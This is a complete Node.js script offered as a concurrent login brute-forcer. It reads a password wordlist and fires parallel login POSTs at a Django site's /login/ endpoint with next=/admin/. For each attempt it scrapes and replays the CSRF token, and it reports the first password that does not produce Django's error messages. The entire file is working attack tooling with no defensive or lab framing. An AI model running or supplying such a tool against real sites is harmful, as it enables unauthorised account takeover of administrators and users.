#! /usr/bin/env node
//
// Module Dependencies
//
// npm install request -g
// npm install async -g
//
module.paths.push('/usr/local/lib/node_modules');

var request = require('request');
var fs      = require('fs');
var async   = require('async');

// Usage message
if (process.argv.length !== 5) {
  console.log(
    'NodeJS Concurrent Login Bruteforce 1.0\n' +
    'Usage: ./bruteforce.js <username> <wordlist> <target url>' 
  );

  process.exit();
}

// Set user, filepath, url from CLI args
var username = process.argv[2];
var filepath = process.argv[3];
var baseUrl  = process.argv[4];

// Set regexp to define CSRF and login errors
var CSRF    = /<input type='hidden' name='csrfmiddlewaretoken' value='(.*)' \/>/;
var ERROR_1 = /Please enter the correct username/ ;
var ERROR_2 = /Please correct the error below/;

// Read words from file synchronously
var words = fs.readFileSync(filepath).toString().split('\n');

// Configure the CSRF request
var csrfOptions = {
  port: 8000,
  url: baseUrl,
  method: 'GET',
  headers: {}
};

// Define function to extract CSRF token
var getCSRF = function(callback) {
  request(csrfOptions, function (error, response, body) {
    if (!error && response.statusCode == 200) {
      callback(body.match(CSRF)[1]);
    }
  });
};

console.log(words)

// Main Loop
async.each(words, function(word, callback) {

  // Start by grabbing CSRF token
  getCSRF(function(token) {
    
    // Configure the login request
    var loginOptions = {
      port: 8000,
      url: baseUrl + '/login/',
      method: 'POST',
      headers: { 
        Cookie: 'csrftoken=' + token 
      },
      form: {
        csrfmiddlewaretoken: token,
        username: username,
        password: word,
        next: '/admin/'
      }
    };

    // Send a login POST
    request(loginOptions, function (error, response, body) {
      if (!error) {
        // If we match known regex password is incorrect
        if (body.match(ERROR_1) || body.match(ERROR_2)) {
          console.log('[-] Invalid: ' + word);
        } else {
          console.log(
            '[+] FOUND: ' + word  +
            '\n[+] Shutting down....' 
          );

          process.exit();
        }
      }
      callback();
    });
  });
});

 


